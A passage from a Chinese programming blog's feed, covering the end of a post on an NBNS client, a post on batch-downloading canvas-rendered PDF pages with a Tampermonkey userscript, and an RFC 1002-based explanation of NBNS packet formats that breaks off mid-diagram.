<p>上面是正常情况，下面给出两个异常情况的例子。</p>
<pre><code class="bash">➜  nbnstat 192.168.1.10
Send nbns query to 192.168.1.10
recvfrom: Resource temporarily unavailable
➜  nbnstat 192.16
Not in presentation format
</code></pre>
<ol>
<li>第1个是指定IP设备不存在，然后产生超时错误；</li>
<li>第2个是指定IP格式不正确，提示格式错误。</li>
</ol>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文介绍了一个简单<strong>NBNS客户端</strong>的具体实现，该客户端用于向指定IP设备发送NBNS NODE STATUS QUERY，并对请求结果予以分析和打印。涉及到的Socket API函数有socket, bind, sendto, recvfrom, htons, htonl, ntohs, ntohl, inet_pton, setsockopt等。</p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用油猴脚本批量下载canvas图片]]></title>
      <url>https://www.litreily.top/2020/03/15/canvas-dl/</url>
      <content type="html"><![CDATA[<p>女友最近在网上下载一些北大网盘的pdf<a href="https://disk.pku.edu.cn/#/link/3A7748E0466521E3E68A0CBA4C24DE20?gns=AE26ACF837E24D51B1EC40E0A80A5D23%2F7F0E54D7D92343B1B62031B1C41F2280" target="_blank" rel="noopener">文档</a>，结果发现没有下载接口，另存为也只能存储单张图片。找我帮忙，这时候发现程序员男票的好处了哈。</p>
<h2 id="分析页面"><a href="#分析页面" class="headerlink" title="分析页面"></a>分析页面</h2><p>一开始想着使用Chrome调试工具看下pdf链接，发现这个网盘居然不是直接获取的pdf文件，而是使用js脚本动态渲染生成的，涨知识了。</p>
<p><img src="/assets/canvas/pdf-js.png" alt="pdf-combine js"></p>
<p>那看看是否可以以图片形式批量下载呢，结果查看pdf单页的html结构发现，这居然是个canvas!!!还不是普通图片，而是画布。</p>
<p><img src="/assets/canvas/canvas.png" alt="cancvs"></p>
<h2 id="下载插件"><a href="#下载插件" class="headerlink" title="下载插件"></a>下载插件</h2><p>没关系，canvas什么的也不是难事，万能的油猴插件总会有解决方案的，果不其然让我找到个专门用于下载svg, canvas的油猴插件↓</p>
<ul>
<li><a href="https://greasyfork.org/zh-CN/scripts/383101-%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87-%E8%83%8C%E6%99%AF%E5%9B%BE-svg-canvas-%E6%8A%93%E5%8F%96%E9%A2%84%E8%A7%88%E4%B8%8B%E8%BD%BD" target="_blank" rel="noopener">网站图片（背景图，svg，canvas）抓取预览下载</a></li>
</ul>
<h2 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h2><p>这正是我想要的，安装好后，使用起来非常简单，刷新要下载canvas图片的页面，在右下角有一个按钮<strong>自动获取图片</strong>。</p>
<p><img src="/assets/canvas/check-tampermonkey.png" alt="js extension"></p>
<p>点击之后开始扫描，注意下图中的数字并不代表实际的图片数量，不用理会。</p>
<p><img src="/assets/canvas/scanning.png" alt="scanning"></p>
<p>扫描完成后，可以限定图片大小，以滤除不符合要求的小图片，然后通过<strong>批量下载</strong>完成下载，对于数量较多的页面可能需要稍微等一小会，绝大部分情况是很快的。</p>
<p><img src="/assets/canvas/download.png" alt="download"></p>
<p>这样就下载完成啦。</p>
<p><img src="/assets/canvas/downloaded.png" alt="downloaded"></p>
<p>至于如何将批量转换为pdf，那方法就多啦，福昕pdf编辑器、ABBYY等等，这个留待下回再讲，哈哈。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>经评论区大佬@Axun提醒，本文所爬网站的PDF文件是可以直接提取的，刷新页面过滤<code>Access</code>即可得到下面的链接，右键在新页面打开即可保存，然后添加扩展名即可。</p>
<p><img src="/assets/canvas/pdf-source-file.png" alt="PDF source file"></p>
<p>当然啦，本文提及的canvas图片下载方法也适用于其它网站，欢迎食用。</p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tampermonkey </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[网络协议详解1 - NBNS]]></title>
      <url>https://www.litreily.top/2020/02/28/nbns/</url>
      <content type="html"><![CDATA[<h2 id="NetBIOS-简介"><a href="#NetBIOS-简介" class="headerlink" title="NetBIOS 简介"></a>NetBIOS 简介</h2><p><strong>NetBIOS</strong>，Network Basic Input/Output System的缩写，一般指用于<strong>局域网</strong>通信的一套API，相关RFC文档包括 <a href="https://tools.ietf.org/html/rfc1001" target="_blank" rel="noopener">RFC 1001</a>, <a href="https://tools.ietf.org/html/rfc1002" target="_blank" rel="noopener">RFC 1002</a>. RFC 1001主要对NetBIOS及相关协议和服务进行解释说明，RFC 1002给出了相关协议和服务的数据组包格式。</p>
<p>NetBIOS提供三种软件服务：</p>
<table>
<thead>
<tr>
<th>Service Name</th>
<th>Port</th>
<th>Protocol</th>
<th>Short Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>NetBIOS Name service</td>
<td>137</td>
<td>UDP/TCP</td>
<td>NBNS</td>
</tr>
<tr>
<td>NetBIOS Datagram</td>
<td>138</td>
<td>UDP</td>
<td>NBND</td>
</tr>
<tr>
<td>NetBIOS Session service</td>
<td>139</td>
<td>TCP</td>
<td>NBSS</td>
</tr>
</tbody>
</table>
<p>本文主要描述最常见的<code>NBNS</code>.</p>
<a id="more"></a>
<h2 id="NBNS-简介"><a href="#NBNS-简介" class="headerlink" title="NBNS 简介"></a>NBNS 简介</h2><p><strong>NBNS</strong>是NetBIOS name service的缩写，是NetBIOS的命名服务，用于将NetBIOS名称映射到IP地址上，是NetBIOS-over-TCP(NBT)协议族的一份子。NBNS是动态DNS的一种，Microsoft的NBNS实现称为<code>WINS</code>。路由器可以通过发送NBNS状态请求以获取设备名，windows PC 接收到后通过WINS或将本地缓存发送命名信息给路由器。</p>
<h2 id="NBNS-数据报格式"><a href="#NBNS-数据报格式" class="headerlink" title="NBNS 数据报格式"></a>NBNS 数据报格式</h2><p>NBNS的数据报文格式在RFC 1002 Ch4.2中定义，包含以下信息</p>
<pre><code class="md">&gt; 4.2.1 GENERAL FORMAT OF NAME SERVICE PACKETS
&gt;   4.2.1.1 HEADER
&gt;   4.2.1.2 QUESTION SECTION
&gt;   4.2.1.3 RESOURCE RECORD
&gt; 4.2.2 NAME REGISTRATION REQUEST
  4.2.3 NAME OVERWRITE REQUEST &amp; DEMAND
  4.2.4 NAME REFRESH REQUEST
&gt; 4.2.5 POSITIVE NAME REGISTRATION RESPONSE
  4.2.6 NEGATIVE NAME REGISTRATION RESPONSE
  4.2.7 END-NODE CHALLENGE REGISTRATION RESPONSE
  4.2.8 NAME CONFLICT DEMAND
  4.2.9 NAME RELEASE REQUEST &amp; DEMAND
  4.2.10 POSITIVE NAME RELEASE RESPONSE
  4.2.11 NEGATIVE NAME RELEASE RESPONSE
  4.2.12 NAME QUERY REQUEST
  4.2.13 POSITIVE NAME QUERY RESPONSE
  4.2.14 NEGATIVE NAME QUERY RESPONSE
  4.2.15 REDIRECT NAME QUERY RESPONSE
  4.2.16 WAIT FOR ACKNOWLEDGEMENT (WACK) RESPONSE
&gt; 4.2.17 NODE STATUS REQUEST
&gt; 4.2.18 NODE STATUS RESPONSE
</code></pre>
<p>本文主要介绍列表中<code>&gt;</code>开头的部分。</p>
<h3 id="GENERL-HEADER"><a href="#GENERL-HEADER" class="headerlink" title="GENERL HEADER"></a>GENERL HEADER</h3><p>NetBIOS数据包的通用格式如下：</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+ ------                                                ------- +
|                            HEADER                             |
+ ------                                                ------- +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                       QUESTION ENTRIES                        /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                   ANSWER RESOURCE RECORDS                     /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                  AUTHORITY RESOURCE RECORDS                   /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                  ADDITIONAL RESOURCE RECORDS                  /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<ul>
<li>HEADER: 头部信息，包含ID信息等</li>
<li>QUESTION ENTRIES: 请求信息</li>
<li>ANSWER RESOURCE RECORDS: 应答信息</li>
<li>AUTHORITY RESOURCE RECORDS: 授权信息</li>
<li>ADDITIONAL RESOURCE RECORDS: 额外添加信息，如注册信息、刷新信息</li>
</ul>
<h4 id="HEADER"><a href="#HEADER" class="headerlink" title="HEADER"></a>HEADER</h4><p>下面先来看<code>HEADER</code>信息。</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           NAME_TRN_ID         | OPCODE  |   NM_FLAGS  | RCODE |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             QDCOUNT           |            ANCOUNT            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             NSCOUNT           |            ARCOUNT            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<ul>
<li>NAME_TRN_ID: Transaction ID, 可以称为交易ID，就是针对本次请求或应答对应的ID</li>
<li>OPCODE: 包的类型码，后面详述</li>
<li>NM_FLAGS: 本次操作相关的标志位，后面详述</li>
<li>RCODE: result code or request, 在应答信息中被填入，具体数值依情况而定</li>
<li>QDCOUNT: uint_16 请求信息条例数量</li>
<li>ANCOUNT: uint_16 应答信息记录数量</li>
<li>NSCOUNT: uint_16 授权资源记录数量</li>
<li>ARCOUNT: uint_16 额外资源记录数量</li>
</ul>
<p>关于<strong>OPCODE</strong>，如下表所示：</p>
<pre><code class="yml">  0   1   2   3   4
+---+---+---+---+---+
| R |    OPCODE     |
+---+---+---+---+---+
</code></pre>
<ul>
<li>R: 为0代表请求包，为1代表应答包</li>
<li>1-4bit的值标志不同的操作：<ul>
<li>0 = query</li>
<li>5 = registration</li>
<li>6 = release</li>
<li>7 = WACK</li>
<li>8 = refresh</li>
</ul>
</li>
</ul>
<p>关于<strong>NM_FLAGS</strong>, 如下表所示：</p>
<pre><code class="yml">  0   1   2   3   4   5   6
+---+---+---+---+---+---+---+
|AA |TC |RD |RA | 0 | 0 | B |
+---+---+---+---+---+---+---+
</code></pre>
<ul>
<li>AA - Authoritative Answer flag, 当OPCODE中的R为0时必须为0，在响应报文中总是被设为1</li>
<li>TC - 截断标志，当数据报长度超过576字节后，需要截断</li>
<li>RD - 仅用于请求包，应答包会复制该值；该值为1代表NBNS会迭代请求、注册和释放</li>
<li>RA - 为1代表可以递归请求、注册和释放，为0则必须迭代请求</li>
<li>B - 为1代表广播包或多播包，为0代表单播包</li>
</ul>
<p><code>RA</code>与<code>RD</code>的原文解释如下：</p>
<blockquote>
<p><strong><code>RA</code></strong> 3 Recursion Available Flag.<br>Only valid in responses from a NetBIOS Name Server -- must be zero in all other responses.<br>If one (1) then the NBNS supports recursive query, registration, and release.<br>If zero (0) then the end-node must iterate for query and challenge for registration.</p>
<p><strong><code>RD</code></strong> 6 Recursion Desired Flag.<br>May only be set on a request to a NetBIOS Name Server.<br>The NBNS will copy its state into the response packet.<br>If one (1) the NBNS will iterate on the query, registration, or release.</p>
</blockquote>
<p>大致意思是，对于请求、注册和释放，包含递归发送和迭代发送两种方式。<code>RA</code>为1说明支持递归，为0说明只能迭代，表征的是一种能力；<code>RD</code>则是说明具体以什么方式发送，如果为1则代表迭代，表征的是一个具体动作，这个值在响应包中会从请求包中复制得到。</p>
<h4 id="QUESTION-SECTION"><a href="#QUESTION-SECTION" class="headerlink" title="QUESTION SECTION"></a>QUESTION SECTION</h4><p>NBNS的请求数据段格式如下：</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                          QUESTION_NAME                        /
/                                                               /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         QUESTION_TYPE         |          QUESTION_CLASS       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<ul>
<li>QUESTION_NAME: 被压缩的NetBIOS，编码格式如 <a href="#NetBIOS-命名编码">NetBIOS-命名编码</a></li>
<li>QUESTION_TYPE: 请求类型<ul>
<li>0x0020 NB: NetBIOS 通用名称服务资源记录</li>
<li>0x0021 NBSTAT: <a href="#NODE-STATUS-REQUEST">NetBIOS NODE STATUS</a> 资源记录</li>
</ul>
</li>
<li>QUESTION_CLASS: 请求类别<ul>
<li>0x0001 Internet class</li>
</ul>
</li>
</ul>
<h4 id="RESOURCE-RECORD"><a href="#RESOURCE-RECORD" class="headerlink" title="RESOURCE RECORD"></a>RESOURCE RECORD</h4><p>NBNS的资源数据段可以存在于请求报文和应答报文中，数据格式如下：</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                            RR_NAME                            /
/                                                               /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            RR_TYPE            |            RR_CLASS           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                              TTL                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            RDLENGTH           |                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                               |
/                                                               /
/                             RDATA                             /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<ul>
<li>RR_NAME: 与上述的<code>QUESTION_NAME</code>一致</li>
<li>RR_TYPE: 记录类型<ul>
<li>0x0001 A: IP地址记录</li>
<li>0x0002 NS: Name Server资源记录</li>
<li>0x000A NULL: 空记录</li>
<li>0x0020 NB: NetBIOS 通用名称服务资源记录</li>
<li>0x0021 NBSTAT: <a href="#NODE-STATUS-REQUEST">NetBIOS NODE STATUS</a> 资源记录</li>
</ul>
</li>
<li>RR_CLASS: 记录类别<ul>
<li>0x0001 Internet class</li>
</ul>
</li>
<li>RDLENGTH: uint_16 指定RDATA数据段的数据长度</li>
<li>TTL: 某资源记录名称的生存时间</li>
<li>RDATA: 基于<code>RR_TYPE</code>和<code>RR_CLASS</code>的数据信息，包含具体的NetBIOS name.</li>
</ul>
<p>针对RR_TYPE为NB的情况，RDATA的<code>NB_FLAGS</code>部分的数据格式如下：</p>
<pre><code class="yml">                                          1   1   1   1   1   1
  0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| G |  ONT  |                RESERVED                           |
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
</code></pre>
<ul>
<li>G: 为0代表unique NetBIOS name, 即唯一名称；为1代表group NetBIOS name, 即组名称。</li>
<li>ONT: Owner Node Type<ul>
<li>00 = B node, 广播节点(Broadcast)</li>
<li>01 = P node, 单播节点(Point to Point)</li>
<li>10 = M node, 混合节点(Mixed)</li>
<li>11 = Reserved</li>
</ul>
</li>
<li>RESERVED</li>
</ul>
<p>以上便是HEADER, QUESTION SECTION以及RESOURCE RECORD 3个部分的主要内容，所有NBNS相关的请求包和响应包都依循以上格式，具体的信息细节则依情况而定。</p>
<h3 id="NAME-REGISTRATION-REQUEST"><a href="#NAME-REGISTRATION-REQUEST" class="headerlink" title="NAME REGISTRATION REQUEST"></a>NAME REGISTRATION REQUEST</h3><p>名称注册请求格式如下：</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         NAME_TRN_ID           |0|  0x5  |0|0|1|0|0 0|B|  0x0  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0001               |           0x0000              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0000               |           0x0001              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                         QUESTION_NAME                         /
/                                                               /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           NB (0x0020)         |        IN (0x0001)            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                            RR_NAME                            /
/                                                               /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           NB (0x0020)         |        IN (0x0001)            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                              TTL                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           0x0006              |        NB_FLAGS               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          NB_ADDRESS                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>可以和上面介绍的进行一一核对，头部信息的<code>OPCODE</code>为<code>0|0x5</code>, R为0说明是请求包，0x5说明是registration，即注册信息请求；NM_FLAGS<code>AA|TC|RD|RA|0|0|B</code>为<code>0|0|1|0|0|0|B</code>, 因为是请求包，所以<code>AA=0</code>；默认支持注册信息请求包含query和additional两部分信息，所以<code>QDCOUNT</code>和<code>ARCOUND</code>均为1，其余两个计数值为0。</p>
<p>HEADER往后是QUESTION_NAME，NB (0x0020)说明名称请求类型为<code>NB</code>, 请求类别通常均为0x0001, 固定不变。</p>
<p>再往后是TTL，固定的0x0006表征NB_FLAGS和NB_ADDRESS的总长为6个字节。其中NB_ADDRESS就是要注册的地址，而NB_FLAGS标记了这个名称的唯一性和数据包的类型（广播还是单播）。</p>
<h3 id="POSTIVE-NAME-REGISTRATION-RESPONSE"><a href="#POSTIVE-NAME-REGISTRATION-RESPONSE" class="headerlink" title="POSTIVE NAME REGISTRATION RESPONSE"></a>POSTIVE NAME REGISTRATION RESPONSE</h3><pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| NAME_TRN_ID |1| 0x5 |1|0|1|1|0 0|0| 0x0 |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0000               |           0x0001              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0000               |           0x0000              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                            RR_NAME                            /
/                                                               /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           NB (0x0020)         |        IN (0x0001)            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                              TTL                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           0x0006              |        NB_FLAGS               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          NB_ADDRESS                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>在Registration response中，HEADER的<code>R</code>和<code>AA</code>都变成了1，代表响应包；<code>B</code>为0代表单播包形式发送；<code>RA</code>与<code>RD</code>均为1，说明终端支持递归请求、注册和释放，但是会以迭代的方式进行请求、注册或释放。后面部分与请求注册的信息一致。</p>
<h3 id="NODE-STATUS-REQUEST"><a href="#NODE-STATUS-REQUEST" class="headerlink" title="NODE STATUS REQUEST"></a>NODE STATUS REQUEST</h3><p>Node status request也是路由器获取PC设备名称的常用方式，其请求格式如下：</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| NAME_TRN_ID |0| 0x0 |0|0|0|0|0 0|B| 0x0 |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0001               |           0x0000              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0000               |           0x0000              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                         QUESTION_NAME                         /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         NBSTAT (0x0021)       |        IN (0x0001)            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>与registration相比，RR_TYPE由NB变味了NBSTAT，少了Additional部分，仅仅包含请求信息。</p>
<h3 id="NODE-STATUS-RESPONSE"><a href="#NODE-STATUS-RESPONSE" class="headerlink" title="NODE STATUS RESPONSE"></a>NODE STATUS RESPONSE</h3><p>Node status response的数据包格式如下：</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         NAME_TRN_ID           |1|  0x0  |1|0|0|0|0 0|0|  0x0  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0000               |           0x0001              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0000               |           0x0000              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                            RR_NAME                            /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         NBSTAT (0x0021)       |        IN (0x0001)            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          0x00000000                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            RDLENGTH           |   NUM_NAMES   |               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+               +
|                                                               |
+                                                               +
/                         NODE_NAME ARRAY                       /
+                                                               +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+                                                               +
/                           STATISTICS                          /
+                                                               +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>节点状态信息很多，其中<code>NUM_NAMES</code>表示后面紧随的节点名称数组长度，每个数组元素包含18字节：16字节的名称和2个字节的NAME_FLAGS. NAME_FLAGS格式如下：</p>
<pre><code class="yml">                                          1   1   1   1   1   1
  0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| G |  ONT  |DRG|CNF|ACT|PRM|          RESERVED                 |
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
</code></pre>
<ul>
<li>G: 组名标志，为1代表组名，为0代表唯一名称</li>
<li>ONT: Owner Node Type<ul>
<li>00 = B node</li>
<li>01 = P node</li>
<li>10 = M node</li>
<li>11 = Reserved</li>
</ul>
</li>
<li>DRG: 注销标志</li>
<li>CNF: 冲突标志</li>
<li>ACT: 有效名称标志，均设置为1</li>
<li>PRM: 永久名称标志</li>
<li>RESERVED</li>
</ul>
<p>STATISTICS字段的格式如下：</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|               UNIT_ID (Unique unit ID)                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       UNIT_ID,continued       |    JUMPERS    |  TEST_RESULT  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       VERSION_NUMBER          |      PERIOD_OF_STATISTICS     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       NUMBER_OF_CRCs          |     NUMBER_ALIGNMENT_ERRORS   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       NUMBER_OF_COLLISIONS    |       NUMBER_SEND_ABORTS      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       NUMBER_GOOD_SENDS                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      NUMBER_GOOD_RECEIVES                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       NUMBER_RETRANSMITS      | NUMBER_NO_RESOURCE_CONDITIONS |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  NUMBER_FREE_COMMAND_BLOCKS   |  TOTAL_NUMBER_COMMAND_BLOCKS  |
